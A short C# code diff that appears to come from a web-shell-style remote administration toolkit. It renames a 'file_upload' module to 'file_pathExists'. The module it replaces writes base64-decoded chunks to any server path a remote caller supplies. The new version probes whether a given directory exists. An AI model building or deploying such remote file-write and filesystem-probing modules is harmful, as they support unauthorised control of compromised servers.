@@ -8,7 +8,7 @@ using System.Runtime.InteropServices;
 using System.Reflection;
 using System.Threading;
 
-public class file_upload
+public class file_pathExists
 {
     private Dictionary<string, string> fnParseParams(string szParam)
     {
@@ -62,25 +62,15 @@ public class file_upload
             Dictionary<string, string> dic = fnParseParams(szParam);
             StringBuilder sb = new StringBuilder();
 
-            string szPath = fnB64Decode(dic["z0"]);
-            string szChunkSize = fnB64Decode(dic["z1"]);
-            string szChunkData = fnB64Decode(dic["z2"]);
-
-            szChunkData = szChunkData.Replace("\r", "").Replace("\n", "");
-
-            try
+            string szDirPath = fnB64Decode(dic["z0"]);
+            if (Directory.Exists(szDirPath))
             {
-                byte[] abBuffer = Convert.FromBase64String(szChunkData);
-                using (FileStream fs = new FileStream(szPath, FileMode.Append, FileAccess.Write))
-                {
-                    fs.Write(abBuffer, 0, abBuffer.Length);
-                }
-
-                sb.Append("1");
+                string szPath = Path.GetFullPath(szDirPath);
+                sb.Append("1|" + szPath);
             }
-            catch (Exception ex)
+            else
             {
-                sb.Append("0");
+                sb.Append("ERROR://Cannot open directory.");
             }
 
             fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));
